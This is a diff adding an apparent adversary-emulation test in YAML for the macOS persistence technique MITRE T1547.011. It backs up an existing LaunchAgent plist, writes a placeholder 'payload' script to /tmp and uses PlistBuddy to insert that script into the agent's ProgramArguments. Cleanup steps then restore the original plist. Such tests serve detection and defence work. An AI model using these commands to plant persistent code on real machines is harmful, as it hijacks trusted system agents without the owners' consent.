@@ -1,0 +1,61 @@
+api_version: 2.0
+uuid: 12345678-3333-3333-3333-333333333333
+name: Modify existing LaunchAgent
+description: Modifies an existing LaunchAgent plist to inject persistent code
+mitre_attack_id: T1547.011
+mitre_attack_technique: Boot or Logon Initialization Scripts - Plist Modification
+mitre_attack_tactic: Persistence
+platforms:
+  - darwin
+requirements:
+  platforms:
+    - os: darwin
+args:
+  target_agent:
+    description: Name of existing LaunchAgent to modify
+    type: string
+    default: com.apple.Spotlight.index
+  malicious_script:
+    description: Path to malicious script to inject
+    type: string
+    default: /tmp/injected_payload.sh
+  backup_path:
+    description: Path to backup the original plist
+    type: string
+    default: /tmp/original_plist_backup.plist
+steps:
+  - name: backup_original_plist
+    type: shell_command
+    command: "cp ~/Library/LaunchAgents/{{ target_agent }}.plist {{ backup_path }}"
+  
+  - name: create_injected_script
+    type: create_file
+    path: "{{ malicious_script }}"
+    contents: |
+      #!/bin/bash
+      # Injected payload
+      echo "Modified LaunchAgent executed at $(date)" >> /tmp/modified.log
+      # Perform malicious actions
+    permissions: "0755"
+  
+  - name: inject_into_plist
+    type: shell_command
+    command: |
+      /usr/libexec/PlistBuddy -c "Add :ProgramArguments:0 string {{ malicious_script }}" ~/Library/LaunchAgents/{{ target_agent }}.plist
+
+checks:
+  - type: file_contains
+    path: "~/Library/LaunchAgents/{{ target_agent }}.plist"
+    value: "{{ malicious_script }}"
+  - type: file_exists
+    path: "{{ backup_path }}"
+
+cleanup:
+  - type: shell_command
+    command: "cp {{ backup_path }} ~/Library/LaunchAgents/{{ target_agent }}.plist"
+  - type: remove_file
+    path: "{{ backup_path }}"
+  - type: remove_file
+    path: "{{ malicious_script }}"
+  - type: remove_file
+    path: "/tmp/modified.log"
